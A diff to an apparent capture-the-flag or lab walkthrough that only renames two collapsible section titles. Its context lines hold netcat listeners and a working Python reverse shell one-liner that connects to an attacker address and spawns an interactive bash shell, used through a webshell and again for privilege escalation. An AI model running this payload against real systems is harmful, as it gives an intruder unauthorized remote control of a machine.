@@ -105,7 +105,7 @@ nc -lvnp 4444
 A Python reverse shell was then executed through the webshell:
 
 <details>
-<summary>Python Reverse Shell Payload</summary>
+<summary>Python Reverse Shell</summary>
 
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.182",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
@@ -201,7 +201,7 @@ nc -lvnp 5555
 The `test.py` script was then overwritten with a Python reverse shell payload:
 
 <details>
-<summary>Python Reverse Shell Payload</summary>
+<summary>Privilege Escalation Payload</summary>
 
 ```bash
 cat > test.py << 'EOF'
